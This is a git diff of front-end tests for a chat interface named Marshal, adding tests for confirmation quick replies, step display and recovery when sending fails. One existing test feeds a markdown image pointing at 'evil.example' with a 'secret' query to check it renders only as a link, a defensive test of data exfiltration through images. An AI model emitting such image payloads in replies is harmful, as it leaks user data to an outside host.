@@ -121,6 +121,44 @@ describe('ChatView', () => {
     expect(wrapper.find('[data-test="awaiting-answer"]').exists()).toBe(false)
   })
 
+  it('answers a confirmation question with the quick replies', async () => {
+    const server = new FakeServer().handle('POST', turns, (request) =>
+      eventStream([JSON.parse(request.body).text === 'Yes' ? final('Unlocked.', 's-7') : final('Should I unlock the front door?', 's-7', true)]),
+    )
+    const wrapper = await mountChat(server)
+
+    await send(wrapper, 'unlock the front door')
+    await flushPromises()
+    await wrapper.get('[data-test="awaiting-answer"] [data-test="yes"]').trigger('click')
+    await flushPromises()
+
+    expect(body(server.request('POST', turns))).toMatchObject({ text: 'Yes', conversationId: 's-7' })
+    expect(wrapper.findAll('[data-role="user"]').at(-1)!.text()).toBe('Yes')
+    expect(wrapper.find('[data-test="awaiting-answer"]').exists()).toBe(false)
+  })
+
+  it('keeps the steps of a turn in the reply after it finished', async () => {
+    const server = new FakeServer().handle('POST', turns, () => eventStream([sse('status', { text: 'Checking the printer…' }), final('Printing.')]))
+    const wrapper = await mountChat(server)
+
+    await send(wrapper, 'printer?')
+    await flushPromises()
+
+    expect(wrapper.findAll('[data-role="assistant"]').at(-1)!.get('[data-test="step"]').text()).toBe('Checking the printer…')
+  })
+
+  it('puts the text back into the composer when sending fails', async () => {
+    const server = new FakeServer().handle('POST', turns, () => Promise.reject(new TypeError('Failed to fetch')))
+    const wrapper = await mountChat(server)
+
+    await send(wrapper, 'hello?')
+    await flushPromises()
+
+    expect(wrapper.text()).toContain('Marshal could not be reached')
+    expect((wrapper.get('textarea').element as HTMLTextAreaElement).value).toBe('hello?')
+    expect(wrapper.findAll('[data-role="user"]')).toHaveLength(0)
+  })
+
   it('renders an external image in a reply as a link, never as an image', async () => {
     const server = new FakeServer().handle('POST', turns, () => eventStream([final('![x](https://evil.example/?q=secret)')]))
     const wrapper = await mountChat(server)
@@ -129,7 +167,7 @@ describe('ChatView', () => {
     await flushPromises()
 
     const reply = wrapper.findAll('[data-role="assistant"]').at(-1)!
-    expect(reply.find('img').exists()).toBe(false)
+    expect(reply.find('.markdown img').exists()).toBe(false)
     expect(reply.get('a').attributes('href')).toBe('https://evil.example/?q=secret')
   })
 
